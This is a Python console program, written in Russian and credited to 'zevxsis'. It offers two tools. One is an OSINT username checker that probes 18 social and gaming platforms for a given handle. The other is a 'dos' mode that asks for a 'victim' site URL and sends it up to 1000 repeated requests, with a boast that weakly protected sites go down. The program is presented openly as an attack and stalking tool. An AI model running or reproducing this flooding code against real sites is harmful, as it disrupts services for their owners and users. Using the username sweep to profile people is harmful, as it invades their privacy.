import os, sys, time, colorama, requests
fch,fcl,x, cout = colorama.Fore.CYAN, colorama.Fore.RESET, 0, 150
inputc, grebcard, redcard, yellcard, strangecard = f"{fcl}>{fch}>{fcl}> ", f"{colorama.Fore.GREEN}[+]{fcl}", f"{colorama.Fore.RED}[!]{fcl}", f"{colorama.Fore.YELLOW}[-]{fcl}", f"{colorama.Fore.LIGHTBLACK_EX}[unknown thing]{fcl}"
def vk():
    global vklink
    try:
        vks = requests.get(vklink)
        answrvk = vks.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) VK. {answrvk}. {vklink}") if 100 <= answrvk <= 103 else print(f"{grebcard}(успешно) VK. {answrvk}. {vklink}") if (200 <= answrvk <= 206) else print(f"{yellcard}(перенаправление) VK. {answrvk}. {vklink}") if (300 <= answrvk <= 308) else print(f"{redcard}(не найдено) VK. {answrvk}. {vklink}") if (400 <= answrvk <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) VK. {answrvk}. {vklink}") if 500 <= answrvk <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. VK. {vklink}")
def tiktok():
    global ttlink
    try:
        tts = requests.get(ttlink)
        answrtt = tts.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) TikTok. {answrtt}. {ttlink}") if 100 <= answrtt <= 103 else print(f"{grebcard}(успешно) TikTok. {answrtt}. {ttlink}") if (200 <= answrtt <= 206) else print(f"{yellcard}(перенаправление) TikTok. {answrtt}. {ttlink}") if (300 <= answrtt <= 308) else print(f"{redcard}(не найдено) TikTok. {answrtt}. {ttlink}") if (400 <= answrtt <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) TikTok. {answrtt}. {ttlink}") if 500 <= answrtt <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. TikTok. {ttlink}")
def tg():
    global tglink
    try:
        tgs = requests.get(tglink)
        answrtg = tgs.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Telegram. {answrtg}. {tglink}") if 100 <= answrtg <= 103 else print(f"{grebcard}(успешно) Telegram. {answrtg}. {tglink}") if (200 <= answrtg <= 206) else print(f"{yellcard}(перенаправление) Telegram. {answrtg}. {tglink}") if (300 <= answrtg <= 308) else print(f"{redcard}(не найдено) Telegram. {answrtg}. {tglink}") if (400 <= answrtg <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Telegram. {answrtg}. {tglink}") if 500 <= answrtg <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. Telegram. {tglink}")
def threads():
    global thredslink
    try:
        thredss = requests.get(thredslink)
        answrthreds = thredss.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Threads. {answrthreds}. {thredslink}") if 100 <= answrthreds <= 103 else print(f"{grebcard}(успешно) Threads. {answrthreds}. {thredslink}") if (200 <= answrthreds <= 206) else print(f"{yellcard}(перенаправление) Threads. {answrthreds}. {thredslink}") if 300 <= answrthreds <= 308 else print(f"{redcard}(не найдено) Threads. {answrthreds}. {thredslink}") if (400 <= answrthreds <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Threads. {answrthreds}. {thredslink}") if 500 <= answrthreds <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. Threads. {thredslink}")
def spotify():
    global spotifylink
    try:
        spotifys = requests.get(spotifylink)
        answrspotify = spotifys.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Spotify. {answrspotify}. {spotifylink}") if 100 <= answrspotify <= 103 else print(f"{grebcard}(успешно) Spotify. {answrspotify}. {spotifylink}") if 200 <= answrspotify <= 206 else print(f"{yellcard}(перенаправление) Spotify. {answrspotify}. {spotifylink}") if 300 <= answrspotify <= 308 else print(f"{redcard}(не найдено) Spotify. {answrspotify}. {spotifylink}") if 400 <= answrspotify <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Spotify. {answrspotify}. {spotifylink}") if 500 <= answrspotify <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. Spotify. {spotifylink}")
def youtube():
    global youtubelink
    try:
        youtubes = requests.get(youtubelink)
        answryoutube = youtubes.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) YouTube. {answryoutube}. {youtubelink}") if 100 <= answryoutube <= 103 else print(f"{grebcard}(успешно) YouTube. {answryoutube}. {youtubelink}") if 200 <= answryoutube <= 206 else print(f"{yellcard}(перенаправление) YouTube. {answryoutube}. {youtubelink}") if 300 <= answryoutube <= 308 else print(f"{redcard}(не найдено) YouTube. {answryoutube}. {youtubelink}") if 400 <= answryoutube <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) YouTube. {answryoutube}. {youtubelink}") if 500 <= answryoutube <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. YouTube. {youtubelink}")
def reddit():
    global redditlink
    try:
        reddits = requests.get(redditlink)
        answrreddit = reddits.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Reddit. {answrreddit}. {redditlink}") if 100 <= answrreddit <= 103 else print(f"{grebcard}(успешно) Reddit. {answrreddit}. {redditlink}") if (200 <= answrreddit <= 206) else print(f"{yellcard}(перенаправление) Reddit. {answrreddit}. {redditlink}") if 300 <= answrreddit <= 308 else print(f"{redcard}(не найдено) Reddit. {answrreddit}. {redditlink}") if (400 <= answrreddit <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Reddit. {answrreddit}. {redditlink}") if 500 <= answrreddit <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. Reddit. {redditlink}")
def insta():
    global instalink
    try:
        instas = requests.get(instalink)
        answrinsta = instas.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) Instagram. {answrinsta}. {instalink}") if 100 <= answrinsta <= 103 else print(f"{grebcard}(успешно) Instagram. {answrinsta}. {instalink}") if (200 <= answrinsta <= 206) else print(f"{yellcard}(перенаправление) Instagram. {answrinsta}. {instalink}") if 300 <= answrinsta <= 308 else print(f"{redcard}(не найдено) Instagram. {answrinsta}. {instalink}") if (400 <= answrinsta <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) Instagram. {answrinsta}. {instalink}") if 500 <= answrinsta <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. Instagram. {instalink}")
def wa():
    global walink
    try:
        was = requests.get(walink)
        answrwa = was.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) WhatsApp. {answrwa}. {walink}") if 100 <= answrwa <= 103 else print(f"{grebcard}(успешно) WhatsApp. {answrwa}. {walink}") if (200 <= answrwa <= 206) else print(f"{yellcard}(перенаправление) WhatsApp. {answrwa}. {walink}") if (300 <= answrwa <= 308) else print(f"{redcard}(не найдено) WhatsApp. {answrwa}. {walink}") if (400 <= answrwa <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) WhatsApp. {answrwa}. {walink}") if 500 <= answrwa <= 511 else None
    except:
        print(f"{redcard} Ошибка соединения. WhatsApp. {walink}")
def yamusic():
    global yamusiclink
    try:
        yamusics = requests.get(yamusiclink)
        answryamusic = yamusics.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) yandex music. {answryamusic}. {yamusiclink}") if 100 <= answryamusic <= 103 else print(f"{grebcard}(успешно) yandex music. {answryamusic}. {yamusiclink}") if 200 <= answryamusic <= 206 else print(f"{yellcard}(перенаправление) yandex music. {answryamusic}. {yamusiclink}") if 300 <= answryamusic <= 308 else print(f"{redcard}(не найдено) yandex music. {answryamusic}. {yamusiclink}") if 400 <= answryamusic <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) yandex music. {answryamusic}. {yamusiclink}") if 500 <= answryamusic <= 511 else None
    except:
        print(f"{redcard} oшибка соединения yandex music. {yamusiclink}")
def chess():
    global chesslink
    try:
        chesss = requests.get(chesslink)
        answrchess = chesss.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) chess.com. {answrchess}. {chesslink}") if 100 <= answrchess <= 103 else print(f"{grebcard}(успешно) chess.com. {answrchess}. {chesslink}") if (200 <= answrchess <= 206) else print(f"{yellcard}(перенаправление) chess.com. {answrchess}. {chesslink}") if 300 <= answrchess <= 308 else print(f"{redcard}(не найдено) chess.com. {answrchess}. {chesslink}") if (400 <= answrchess <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) chess.com. {answrchess}. {chesslink}") if 500 <= answrchess <= 511 else None
    except:
        print(f"{redcard} oшибка соединения chess.com. {chesslink}")
def github():
    global githublink
    try:
        githubs = requests.get(githublink)
        answrgithub = githubs.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) github. {answrgithub}. {githublink}") if 100 <= answrgithub <= 103 else print(f"{grebcard}(успешно) github. {answrgithub}. {githublink}") if (200 <= answrgithub <= 206) else print(f"{yellcard}(перенаправление) github. {answrgithub}. {githublink}") if 300 <= answrgithub <= 308 else print(f"{redcard}(не найдено) github. {answrgithub}. {githublink}") if (400 <= answrgithub <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) github. {answrgithub}. {githublink}") if 500 <= answrgithub <= 511 else None
    except:
        print(f"{redcard} oшибка соединения github. {githublink}")
def discord():
    global dslink
    try:
        dss = requests.get(dslink)
        answrds = dss.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) discord. {answrds}. {dslink}") if 100 <= answrds <= 103 else print(f"{grebcard}(успешно) discord. {answrds}. {dslink}") if (200 <= answrds <= 206) else print(f"{yellcard}(перенаправление) discord. {answrds}. {dslink}") if (300 <= answrds <= 308) else print(f"{redcard}(не найдено) discord. {answrds}. {dslink}") if (400 <= answrds <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) discord. {answrds}. {dslink}") if 500 <= answrds <= 511 else None
    except:
        print(f"{redcard} oшибка соединения discord. {dslink}")
def duolingo():
    global duolingolink
    try:
        duolingos = requests.get(duolingolink)
        answrduolingo = duolingos.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) duolingo. {answrduolingo}. {duolingolink}") if 100 <= answrduolingo <= 103 else print(f"{grebcard}(успешно) duolingo. {answrduolingo}. {duolingolink}") if 200 <= answrduolingo <= 206 else print(f"{yellcard}(перенаправление) duolingo. {answrduolingo}. {duolingolink}") if 300 <= answrduolingo <= 308 else print(f"{redcard}(не найдено) duolingo. {answrduolingo}. {duolingolink}") if 400 <= answrduolingo <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) duolingo. {answrduolingo}. {duolingolink}") if 500 <= answrduolingo <= 511 else None
    except:
        print(f"{redcard} oшибка соединения duolingo. {duolingolink}")
def roblox():
    global robloxlink
    try:
        robloxs = requests.get(robloxlink)
        answrroblox = robloxs.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) roblox. {answrroblox}. {robloxlink}") if 100 <= answrroblox <= 103 else print(f"{grebcard}(успешно) roblox. {answrroblox}. {robloxlink}") if (200 <= answrroblox <= 206) else print(f"{yellcard}(перенаправление) roblox. {answrroblox}. {robloxlink}") if 300 <= answrroblox <= 308 else print(f"{redcard}(не найдено) roblox. {answrroblox}. {robloxlink}") if (400 <= answrroblox <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) roblox. {answrroblox}. {robloxlink}") if 500 <= answrroblox <= 511 else None
    except:
        print(f"{redcard} oшибка соединения roblox. {robloxlink}")
def facebook():
    global facebooklink
    try:
        facebooks = requests.get(facebooklink)
        answrfacebook = facebooks.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) facebook. {answrfacebook}. {facebooklink}") if 100 <= answrfacebook <= 103 else print(f"{grebcard}(успешно) facebook. {answrfacebook}. {facebooklink}") if (200 <= answrfacebook <= 206) else print(f"{yellcard}(перенаправление) facebook. {answrfacebook}. {facebooklink}") if 300 <= answrfacebook <= 308 else print(f"{redcard}(не найдено) facebook. {answrfacebook}. {facebooklink}") if 400 <= answrfacebook <= 429 else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) facebook. {answrfacebook}. {facebooklink}") if 500 <= answrfacebook <= 511 else None
    except:
        print(f"{redcard} oшибка соединения facebook. {facebooklink}")
def kwork():
    global kworklink
    try:
        kworks = requests.get(kworklink)
        answrkwork = kworks.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) kwork. {answrkwork}. {kworklink}") if 100 <= answrkwork <= 103 else print(f"{grebcard}(успешно) kwork. {answrkwork}. {kworklink}") if (200 <= answrkwork <= 206) else print(f"{yellcard}(перенаправление) kwork. {answrkwork}. {kworklink}") if 300 <= answrkwork <= 308 else print(f"{redcard}(не найдено) kwork. {answrkwork}. {kworklink}") if (400 <= answrkwork <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) kwork. {answrkwork}. {kworklink}") if 500 <= answrkwork <= 511 else None
    except:
        print(f"{redcard} oшибка соединения kwork. {kworklink}")
def steam():
    global steamlink
    try:
        steams = requests.get(steamlink)
        answrsteam = steams.status_code
        print(f"{strangecard}(сервер плохо справился с обработкой) steam. {answrsteam}. {steamlink}") if 100 <= answrsteam <= 103 else print(f"{grebcard}(успешно) steam. {answrsteam}. {steamlink}") if (200 <= answrsteam <= 206) else print(f"{yellcard}(перенаправление) steam. {answrsteam}. {steamlink}") if (300 <= answrsteam <= 300) else print(f"{redcard}(не найдено) steam. {answrsteam}. {steamlink}") if (400 <= answrsteam <= 429) else print(f"{yellcard}(с сайтом/платформой/серверами какая то шняга) steam. {answrsteam}. {steamlink}") if 500 <= answrsteam <= 511 else None
    except:
        print(f"{redcard} ошибка соединения steam. {steamlink}")
def all_services():
    vk()
    tiktok()
    tg()
    threads()
    spotify()
    youtube()
    reddit()
    insta()
    wa()
    yamusic()
    chess()
    github()
    discord()
    duolingo()
    roblox()
    facebook()
    kwork()
    steam()
def vvoderr():
    for chlen in range(1, 5):
        clear()
        print(f"{colorama.Fore.RED}вы ввели некоректный ответ.\nподождите {5-chlen} секунд...")
        time.sleep(1)
art1 = """                                     
|_t+.__________________......_  /;_      
;________________/     :    / t""o.\\__   
:---|------------------t-----^-`--'  /   
 \\__L___________________\\____________\\  
              ""-. o .--. \\--'/  l  .-t+.
                  \\ (   l) ;""   : /     
      _  _  _       l `--" o;      Y         loading...
 |_||_ |_|| \\       """""";:  .-. :\\    
 | |:_ | |:_/             ::  '-'  ;\\   
  _  _    _  _  _  _       ;;      : ;   
 | _l  | \\|_ |_ \\     : zevxsis ;|   
 :_l|`,  :_/:_ | |:_/      ;'-------';   
                           '"------""  """
def printslow_slow(text):
    for letter in text:
        print(letter, end="", flush=True)
        time.sleep(0.03)
def printslow_fast(text):
    for letter in text:
        print(letter, end="", flush=True)
        time.sleep(0.0000003)
def clear(): os.system("clear" if os.name != "nt" else "cls")
def main():
    global fch, cout, inputc
    while True:
        clear()
        printslow_slow(f'{colorama.Fore.BLUE}░█░█░█▀▀░█▀█░█▀▄░░░█▀█░█▀▀░░░█▀▄░█▀▀░█▀█░█▀▄\n{colorama.Fore.LIGHTBLUE_EX}░█▀█░█▀▀░█▀█░█░█░░░█░█░█▀▀░░░█░█░█▀▀░█▀█░█░█\n{colorama.Fore.CYAN}░▀░▀░▀▀▀░▀░▀░▀▀░░░░▀▀▀░▀░░░░░▀▀░░▀▀▀░▀░▀░▀▀░\n{colorama.Fore.LIGHTBLACK_EX}{" "*15}by zevxsis{fcl}\n\n{" "*10}{time.ctime()}\n{" "*3}+-----------------------------------+\n{" "*3}| 1 - {fch}osint{fcl}       3 - {fch}information{fcl}   |\n{" "*3}| 2 - {fch}dos{fcl}         4 - {fch}settings{fcl}      |\n{" "*3}|         q - {fch}exit{fcl}                  |\n{" "*3}+-----------------------------------+\n')
        snoschoice = input(inputc)
        clear()
        if snoschoice == "q":
            sys.exit()
        elif snoschoice == "2":
            while True:
                clear()
                printslow_fast(f'{fch}⡿⣼⡿⣑⠛⣡⡆⠄⠄⠄⠄⠈⠙⢷⡹⣿⣿⣿⡿⢣⣿⣫⣾⣿⣿⣿⣿{" " * 23}{fcl}ℤ𝔼𝕍𝕏𝕊{fch}𝕀{fcl}𝕊 𝔻𝕆𝕊\n{fch}⢳⣿⣱⣿⡆⣿⠄⠄⠄⠄⠄⠄⠄⠸⣧⢹⣿⡟⣱⡟⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}+------------=={fch}WARN{fcl}1{fch}NG{fcl}==------------+\n{fch}⢸⣧⣿⣿⡇⢿⣀⠄⠄⠄⠄⣄⣼⡆⣹⡆⢩⡾⣡⣾⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}| сносит только {fch}слабозащищенные     {fcl}|\n{fch}⢸⣿⣿⣿⣿⣄⠻⣶⣶⣶⣶⡿⠿⠃⠋⢔⣩⣾⣿⣿⣿⣿⣿⣿⠿⣫⣵{fcl}{" " * 10}| сайты или сделанные через         |\n{fch}⣌⠁⠻⣿⣿⣿⣷⣶⣦⣤⣶⣶⡯⢠⣾⣿⣿⣿⣿⡿⠿⢟⣫⣵⣿⣿⡿{fcl}{" " * 10}| вайбкодинг.                       |\n{fch}⢿⣷⣦⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣆⣀⣒⣚⡛⠋⠉⠉⠄⢀{fcl}{" " * 10}| количество спама можно выбрать    |\n{fch}⢼⣿⣿⣿⣿⣿⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢯⠤⠄⠄⢀⣀⣠⣾{fcl}{" " * 10}| {fch}в настройках{colorama.Fore.LIGHTBLACK_EX} не рекомендуется     {fcl}|\n{fch}⠷⠾⠭⢭⣉⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣏⡻⢶⣦⣤⠴⢿⠋⠁{fcl}{" " * 10}| ставить слишком большое кол-во    |\n{fch}⡲⣝⢿⣿⣿⣿⡿⣛⣩⣭⡉⠻⣿⣿⣿⣿⣴⣿⣿⣿⣷⣶⡾⠋⠁⢀⣤{fcl}{" " * 10}| (можно убить роутер){fcl}              |\n{fch}⣿⢸⣷⡝⣿⣿⢸⣿⣿⣿⣿⠄⠄⣹⣿⣿⣿⣿⣿⣯⣛⠟⠁⠴⠾⠿⣛{fcl}{" " * 10}+-----------------------{fch}zevxsis{fcl}-----+\n{fch}⣿⣼⣿⣟⢧⣿⣮⣝⣛⣉⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⠋⣸⣿⣿⣿⣿⣿\n{fch}⣿⡿⢣⣿⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⣡⣾⣿⣿⣿⠿⣛⡭\n\n')
                printslow_fast(f"{fch}впиши URL сайта жертвы:\n")
                victim = input(inputc).strip()
                clear()
                for i in range(1, cout + 1):
                    try:
                        r = requests.get(victim)
                        print(f"{i}/{cout} {r.status_code}нормалды {grebcard}")
                        time.sleep(0.000003)
                    except:
                        print(f"{i}/{cout}сайта нема {redcard}")
                break
        elif snoschoice == "1":
            while True:
                clear()
                user = input(f"введите {fch}юзер:{fcl}\n{inputc}@").strip()
                global vklink, ttlink, tglink, thredslink, spotifylink, youtubelink, redditlink
                global instalink, walink, yamusiclink, chesslink, githublink, dslink, duolingolink
                global robloxlink, facebooklink, kworklink, steamlink
                vklink = f"https://vk.ru/{user}"
                ttlink = f"https://www.tiktok.com/@{user}"
                tglink = f"https://t.me/{user}"
                thredslink = f"https://www.threads.net/@{user}"
                spotifylink = f"https://open.spotify.com/user/{user}"
                youtubelink = f"https://www.youtube.com/@{user}"
                redditlink = f"https://www.reddit.com/user/{user}"
                instalink = f"https://www.instagram.com/{user}"
                walink = f"https://www.whatsapp.com/@{user}"
                yamusiclink = f"https://music.yandex/{user}/playlists"
                chesslink = f"https://www.chess.com/member/{user}"
                githublink = f"https://github.com/{user}"
                dslink = f"https://discord.com/users/{user}"
                duolingolink = f"https://www.duolingo.com/profile/{user}"
                robloxlink = f"https://www.roblox.com/user.aspx?username={user}"
                facebooklink = f"https://www.facebook.com/{user}"
                kworklink = f"https://kwork.ru/user/{user}"
                steamlink = f"https://steamcommunity.com/id/{user}"
                clear()
                printslow_fast(f'{fch}⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿{" " * 19}{fcl}Z E V X S {fch}I{fcl} S   O S {fch}I{fcl} N T\n{fch}⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿{fcl}{" " * 10}+-----------==={fch}CHOOSE MEDIA:{fcl}===------------+\n{fch}⢸⣿⣷⣧⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉{fcl}{" " * 9}| 1. {fch}VK{fcl}       7. {fch}Reddit{fcl}    13. {fch}Discord{fcl}     |\n{fch}⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀{fcl}{" " * 9}| 2. {fch}TikTok{fcl}   8. {fch}Instagram{fcl} 14. {fch}Duolingo{fcl}    |\n{fch}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⥥⣴{fcl}{" " * 10}| 3. {fch}Telegram{fcl} 9. {fch}WhatsApp{fcl}  15. {fch}Roblox{fcl}      |\n{fch}⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{fcl}{" " * 10}| 4. {fch}Threads{fcl}  10. {fch}YaMusic{fcl}   16. {fch}Facebook{fcl}   |\n{fch}⣦⣌⣛⣻⣿⣿⣧⠙⣿⣿⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄{fcl}{" " * 8}| 5. {fch}Spotify{fcl}  11. {fch}Chess{fcl}     17. {fch}Kwork{fcl}      |\n{fch}⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾{fcl}{" " * 10}| 6. {fch}YouTube{fcl}  12. {fch}GitHub{fcl}    18. {fch}Steam{fcl}      |\n{fch}⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄{fcl}{" " * 8}|            nh - {fch}all{fcl}                      |\n{fch}⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁{fcl}{" " * 11}|             b - {fch}back{fcl}                     |\n{fch}⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄{fcl}{" " * 12}+-------------------------------{fch}zevxsis{fcl}----+\n{fch}⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄\n')
                osintchoice1 = input(inputc).strip()
                clear()
                if osintchoice1 == "b":
                    break
                if osintchoice1 == "1": vk()
                elif osintchoice1 == "2": tiktok()
                elif osintchoice1 == "3": tg()
                elif osintchoice1 == "4": threads()
                elif osintchoice1 == "5": spotify()
                elif osintchoice1 == "6": youtube()
                elif osintchoice1 == "7": reddit()
                elif osintchoice1 == "8": insta()
                elif osintchoice1 == "9": wa()
                elif osintchoice1 == "10": yamusic()
                elif osintchoice1 == "11": chess()
                elif osintchoice1 == "12": github()
                elif osintchoice1 == "13": discord()
                elif osintchoice1 == "14": duolingo()
                elif osintchoice1 == "15": roblox()
                elif osintchoice1 == "16": facebook()
                elif osintchoice1 == "17": kwork()
                elif osintchoice1 == "18": steam()
                elif osintchoice1 == "nh": all_services()
                else: vvoderr()
                input(f"\n{fcl}жми любую кнопку, чтоб выйти\n{inputc}")
                break
        elif snoschoice == "3":
            while True:
                printslow_slow(f'+------------------==={fch}INFORMATION{fcl}===-----------------+\n|  {fcl}создатель: {fch}zevxs{fcl}i{fch}s{fcl}{" " * 32}|\n|  тг канал: {fch}@tembededd{fcl}{" " * 30}|\n|  время писания софта: {fch}11h 19min{fcl}{" " * 20}|\n|  короче барни, 0 ии. пользуйтесь на здоровье{" " * 7}|\n+----------------------------------------{fch}zevxsis{fcl}-----+\n')
                input(f"{fcl}жми любую кнопку, чтоб выйти\n{inputc}")
                break
        elif snoschoice == "4":
            while True:
                clear()
                printslow_fast(f'+------------=={fch}SETT{fcl}1{fch}NGS{fcl}==------------+\n|  1 - {fch}изменить цвет текста{fcl}{" "*10}|\n|  2 - {fch}изменить колво спама в dos{fcl}{" "*4}|\n| (может повлиять на работу роутера) |\n|  b - {fch}back{fcl}{" "*26}|\n+-------------------------{fch}zevxs{fcl}i{fch}s{fcl}----+\n\n')
                setchoice1 = input(inputc).strip()
                clear()
                if setchoice1 == "b":
                    break
                elif setchoice1 == "1":
                    printslow_fast(f"{fcl}1 - {colorama.Fore.RED}красный\n{fcl}2 - {colorama.Fore.GREEN}зеленый\n{fcl}3 - {colorama.Fore.YELLOW}желтый\n{fcl}4 - {colorama.Fore.BLUE}синий\n{fcl}5 - {colorama.Fore.MAGENTA}пурпурный\n{fcl}6 - {colorama.Fore.CYAN}голубой\n{fcl}7 - {colorama.Fore.WHITE}белый\n{fcl}\n")
                    try:
                        color = int(input(inputc))
                        colors = {
                            1: colorama.Fore.RED,
                            2: colorama.Fore.GREEN,
                            3: colorama.Fore.YELLOW,
                            4: colorama.Fore.BLUE,
                            5: colorama.Fore.MAGENTA,
                            6: colorama.Fore.CYAN,
                            7: colorama.Fore.WHITE,
                        }
                        if color in colors:
                            fch = colors[color]
                            inputc = f"{fcl}>{fch}>{fcl}> "
                        else:
                            vvoderr()
                    except ValueError:
                        vvoderr()
                elif setchoice1 == "2":
                    printslow_fast(f"введи количество {fch}спама в dos{fcl}\n{colorama.Fore.LIGHTBLACK_EX}мин 0 макс 1000{fcl}\n\n")
                    try:
                        setchoice3 = int(input(inputc))
                        clear()
                        if setchoice3 > 1000 or setchoice3 < 0:
                            vvoderr()
                        else:
                            cout = setchoice3
                            print(
                                f"{grebcard}успешно\nколво теперь: {cout}"
                            )
                            time.sleep(2)
                            break
                    except ValueError:
                        vvoderr()
                else:
                    vvoderr()
        else:
            vvoderr()
def boot():
    clear()
    log = f"-{colorama.Fore.LIGHTMAGENTA_EX}ZEVXSIS{fcl}-{colorama.Fore.LIGHTRED_EX}HEAD{fcl}-{colorama.Fore.LIGHTBLUE_EX}OR{fcl}-{colorama.Fore.LIGHTGREEN_EX}DEAD{fcl}"
    printslow_fast(f"{fch}{log*50}{fcl}")
    time.sleep(1)
    clear()
    printslow_fast(f"{fch}{art1}{fcl}")
    time.sleep(2)
    clear()
    main()
boot()